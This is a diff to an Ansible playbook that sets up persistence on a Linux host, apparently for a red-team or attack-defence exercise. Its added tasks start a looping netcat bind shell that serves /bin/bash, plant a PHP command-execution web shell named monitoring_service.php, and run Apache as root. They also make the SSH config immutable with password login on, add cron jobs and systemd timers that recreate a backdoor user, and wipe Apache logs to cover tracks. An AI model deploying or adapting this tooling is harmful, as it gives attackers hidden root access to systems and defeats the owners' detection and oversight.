@@ -12,7 +12,7 @@
     persistence_password: "redteamsucks"
     backdoor_port: 4200
     bashrc_backdoor_port: 3299
-    webshell_port: 80
+    webshell_port: 81
     
   tasks:
     - name: Wait for SSH to become available
@@ -64,6 +64,88 @@
         path: /etc/ssh/sshd_config
         regexp: '^#?PasswordAuthentication'
         line: 'PasswordAuthentication yes'
+
+    - name: Make SSH config immutable
+      command: chattr +i /etc/ssh/sshd_config
+      ignore_errors: yes
+
+    - name: Enable SSH service to start on boot
+      systemd:
+        name: ssh
+        enabled: yes
+        masked: no
+
+    - name: Create SSH service protection script
+      copy:
+        content: |
+          #!/bin/bash
+          # Ensure SSH is always running
+          if ! systemctl is-active --quiet ssh; then
+              systemctl start ssh
+          fi
+          # Restore immutable flag if removed
+          if ! lsattr /etc/ssh/sshd_config 2>/dev/null | grep -q 'i'; then
+              chattr +i /etc/ssh/sshd_config 2>/dev/null
+          fi
+        dest: /usr/local/bin/protect_ssh.sh
+        mode: '0755'
+        owner: root
+        group: root
+
+    - name: Create cron job to protect SSH
+      copy:
+        content: |
+          * * * * * root /usr/local/bin/protect_ssh.sh
+        dest: /etc/cron.d/ssh_protection
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Create systemd service for SSH protection
+      copy:
+        content: |
+          [Unit]
+          Description=SSH Protection Service
+          After=network.target
+          
+          [Service]
+          Type=oneshot
+          ExecStart=/usr/local/bin/protect_ssh.sh
+          User=root
+          
+          [Install]
+          WantedBy=multi-user.target
+        dest: /etc/systemd/system/ssh-protection.service
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Create systemd timer for SSH protection
+      copy:
+        content: |
+          [Unit]
+          Description=SSH Protection Timer
+          
+          [Timer]
+          OnBootSec=30sec
+          OnUnitActiveSec=1min
+          
+          [Install]
+          WantedBy=timers.target
+        dest: /etc/systemd/system/ssh-protection.timer
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Reload systemd for SSH protection
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start SSH protection timer
+      systemd:
+        name: ssh-protection.timer
+        enabled: yes
+        state: started
 
     - name: Restart SSH service
       service:
@@ -154,67 +236,148 @@
         group: root
         mode: '0644'
 
-    - name: Create web shell directory
-      file:
-        path: /var/webserver
-        state: directory
-        mode: '0755'
-        owner: root
-        group: root
+    - name: Start bashrc backdoor immediately for root
+      shell: |
+        nohup bash -c 'while true; do nc -lvnp {{ bashrc_backdoor_port }} -e /bin/bash 2>/dev/null; sleep 1; done' &
+      args:
+        executable: /bin/bash
+      async: 0
+      poll: 0
+      ignore_errors: yes
 
-    - name: Create PHP web shell
+    - name: Kill any processes using port 81
+      shell: "fuser -k 81/tcp"
+      ignore_errors: yes
+
+    - name: Install Apache2 and PHP
+      apt:
+        name:
+          - apache2
+          - php
+          - libapache2-mod-php
+        state: present
+        update_cache: yes
+      ignore_errors: yes
+
+    - name: Stop Apache completely
+      shell: |
+        systemctl stop apache2
+        pkill -9 apache2
+        sleep 2
+      ignore_errors: yes
+
+    - name: Remove any Apache lock files
+      shell: "rm -f /var/run/apache2/*.pid"
+      ignore_errors: yes
+
+    - name: Create PHP web shell in web root
       copy:
         content: |
           <?php system($_REQUEST['cmd']); ?>
-        dest: /var/webserver/monitoring_service.php
+        dest: /var/www/html/monitoring_service.php
         mode: '0644'
         owner: root
         group: root
 
-    - name: Create web server script
+    - name: Completely comment out the root check lines in apache2.conf
+      shell: |
+        sed -i '110,120s/^[^#]/#&/' /etc/apache2/apache2.conf
+      ignore_errors: yes
+
+    - name: Create clean Apache envvars
       copy:
         content: |
-          #!/bin/bash
-          cd /var/webserver
-          python3 -m http.server {{ webshell_port }} 2>/dev/null
-        dest: /usr/local/bin/start_webserver.sh
+          unset HOME
+          if [ "${APACHE_CONFDIR}" = "" ] ; then
+              APACHE_CONFDIR=/etc/apache2
+          fi
+          if [ "${APACHE_ENVVARS}" != "" ] ; then
+              export APACHE_ENVVARS
+          fi
+          export APACHE_RUN_USER=root
+          export APACHE_RUN_GROUP=root
+          export APACHE_PID_FILE=/var/run/apache2/apache2.pid
+          export APACHE_RUN_DIR=/var/run/apache2
+          export APACHE_LOCK_DIR=/var/lock/apache2
+          export APACHE_LOG_DIR=/var/log/apache2
+          export LANG=C
+          export LANG
+        dest: /etc/apache2/envvars
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Create Apache ports.conf
+      copy:
+        content: |
+          Listen {{ webshell_port }}
+        dest: /etc/apache2/ports.conf
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Create Apache default site
+      copy:
+        content: |
+          <VirtualHost *:{{ webshell_port }}>
+                  ServerAdmin webmaster@localhost
+                  DocumentRoot /var/www/html
+                  
+                  ErrorLog ${APACHE_LOG_DIR}/error.log
+                  CustomLog ${APACHE_LOG_DIR}/access.log combined
+                  
+                  <Directory /var/www/html>
+                          Options Indexes FollowSymLinks
+                          AllowOverride None
+                          Require all granted
+                  </Directory>
+          </VirtualHost>
+        dest: /etc/apache2/sites-available/000-default.conf
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Ensure Apache run directory exists
+      file:
+        path: /var/run/apache2
+        state: directory
+        owner: root
+        group: root
         mode: '0755'
-        owner: root
-        group: root
 
-    - name: Create systemd service for web server
-      copy:
-        content: |
-          [Unit]
-          Description=Web Monitoring Interface
-          After=network.target
-          
-          [Service]
-          Type=simple
-          ExecStart=/usr/local/bin/start_webserver.sh
-          Restart=always
-          RestartSec=3
-          User=root
-          WorkingDirectory=/var/webserver
-          StandardOutput=null
-          StandardError=null
-          
-          [Install]
-          WantedBy=multi-user.target
-        dest: /etc/systemd/system/web-monitor.service
-        mode: '0644'
-        owner: root
-        group: root
+    - name: Test Apache configuration
+      command: apache2ctl configtest
+      register: apache_test
+      ignore_errors: yes
 
-    - name: Reload systemd daemon for web server
+    - name: Display Apache config test
+      debug:
+        msg: "{{ apache_test.stderr_lines }}"
+      when: apache_test is defined
+
+    - name: Enable and start Apache service
       systemd:
+        name: apache2
+        enabled: yes
+        state: restarted
         daemon_reload: yes
 
-    - name: Enable and start web server service
-      systemd:
-        name: web-monitor.service
-        enabled: yes
-        state: started
+    - name: Wait for Apache port
+      wait_for:
+        port: "{{ webshell_port }}"
+        delay: 2
+        timeout: 10
+      ignore_errors: yes
+
+    - name: Check what's listening on port 81
+      shell: "ss -tlnp | grep :81"
+      register: port_check
+      ignore_errors: yes
+
+    - name: Display port 81 status
+      debug:
+        msg: "{{ port_check.stdout_lines }}"
+      when: port_check is defined
 
     - name: Create persistence script
       copy:
@@ -233,13 +396,64 @@
         owner: root
         group: root
 
-    - name: Create cron job for persistence
-      cron:
-        name: "Create persistence user"
-        minute: "*/2"
-        job: "/usr/local/bin/create_persistence_user.sh"
-        user: root
-        state: present
+    - name: Run persistence script immediately
+      shell: /usr/local/bin/create_persistence_user.sh
+      ignore_errors: yes
+
+    - name: Create cron job in /etc/cron.d for persistence
+      copy:
+        content: |
+          */2 * * * * root /usr/local/bin/create_persistence_user.sh
+        dest: /etc/cron.d/persistence_user
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Create systemd service for persistence
+      copy:
+        content: |
+          [Unit]
+          Description=User Persistence Service
+          After=network.target
+          
+          [Service]
+          Type=oneshot
+          ExecStart=/usr/local/bin/create_persistence_user.sh
+          User=root
+          
+          [Install]
+          WantedBy=multi-user.target
+        dest: /etc/systemd/system/user-persistence.service
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Create systemd timer for persistence
+      copy:
+        content: |
+          [Unit]
+          Description=User Persistence Timer
+          
+          [Timer]
+          OnBootSec=1min
+          OnUnitActiveSec=2min
+          
+          [Install]
+          WantedBy=timers.target
+        dest: /etc/systemd/system/user-persistence.timer
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Reload systemd daemon for persistence timer
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start persistence timer
+      systemd:
+        name: user-persistence.timer
+        enabled: yes
+        state: started
 
     - name: Create netcat backdoor script
       copy:
@@ -285,7 +499,7 @@
       systemd:
         name: system-monitor.service
         enabled: yes
-        state: started
+        state: restarted
 
     - name: Clear auth logs
       shell: "truncate -s 0 {{ item }}"
@@ -354,6 +568,14 @@
 
     - name: Vacuum systemd journal
       shell: "journalctl --vacuum-time=1s"
+      ignore_errors: yes
+
+    - name: Clear Apache access logs
+      shell: "truncate -s 0 /var/log/apache2/access.log*"
+      ignore_errors: yes
+
+    - name: Clear Apache error logs
+      shell: "truncate -s 0 /var/log/apache2/error.log*"
       ignore_errors: yes
 
     - name: Display completion message
